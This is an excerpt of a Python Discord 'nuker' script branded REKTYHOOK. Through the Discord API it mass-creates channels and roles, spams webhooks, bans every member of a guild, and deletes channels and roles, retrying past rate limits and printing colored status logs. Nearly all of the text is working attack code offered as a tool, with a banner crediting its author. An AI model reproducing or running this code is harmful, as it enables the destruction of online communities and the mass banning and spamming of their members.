...
async def create_channels(session,channel_name, type:int=0):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers, json={'name': channel_name, 'type': type}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142m[!! REKTYHOOK !!] Ratelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34m [++ REKTYHOOK++] Created Channel to {guild_id} - {channel_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196m[!! REKTYHOOK !!] Couldn't Create Channel to {guild_id}")
            pass

async def create_roles(session,role_name):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v10/guilds/{guild_id}/roles', headers=headers, json={'name': role_name}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142m[!! REKTYHOOK !!] Ratelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34m[++ REKTYHOOOK ++] Created Role to {guild_id} - {role_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196m[!! REKTYHOOK !!] Couldn't Create Role to {guild_id}")
            pass
...
async def WebhookSpam(session, channel_id, web_name, msg_amt:int, msg):
    ...
    try:
        async with session.post(f'https://discord.com/api/v10/channels/{channel_id}/webhooks', headers=headers, json={'name': web_name}) as r:
            if r.status == 429:
                print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142m[!! REKTYHOOK !!] Ratelimited, retrying soon..")
            else:
                if r.status in [200, 201, 204]:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34m[!! REKTYHOOK !!] Created Webhook {web_name} to {channel_id}")
        ...
        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196m[!! REKTYHOOK !!] Create Webhook to {channel_id}")
...
async def get_roles():
    ...
    try:
        ...
        print("[-- REKTYHOOK --] SUS RATELIMTED...!")
...
async def get_members():
    ...
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
...
async def ban_members(session, member_id:str):
    while True:
        try:
            async with session.put(f"https://discord.com/api/v10/guilds/{guild_id}/bans/{member_id}", headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;142m[!! REKTYHOOK !!] Ratelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34m[-- REKTYHOOK --] Banned Member {member_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196m[!! REKTYHOOK !!] Couldn't Ban Member {member_id}")
        ...
        try:
            async with session.delete(f'https://discord.com/api/v10/channels/{channel_id}', headers=headers) as r:
                if r.status == 429:
                    ...
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34m[-- REKTYHOOK --] Deleted Channel {channel_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196m[!! REKTYHOOK !!] Couldn't Delete Channel {channel_id}")
        ...
        try:
            async with session.delete(f'https://discord.com/api/v10/guilds/{guild_id}/roles/{role_id}', headers=headers) as r:
                if r.status == 429:
                    ...
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;34m[-- REKTYHOOK --] Deleted Role {role_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.utcnow().strftime(' %H:%M:%S.%f - ')}\x1b[38;5;196m[!! REKTYHOOK!! Couldn't Delete Role {role_id}")
...
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓██████▓▒░       ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ...
    print(Center.XCenter(f"""                                  
                          ...
                          \033[38;2;255;0;180m║   \033[37mVersion: {version.parse(__VERSION__)} Made By Rekt             ║
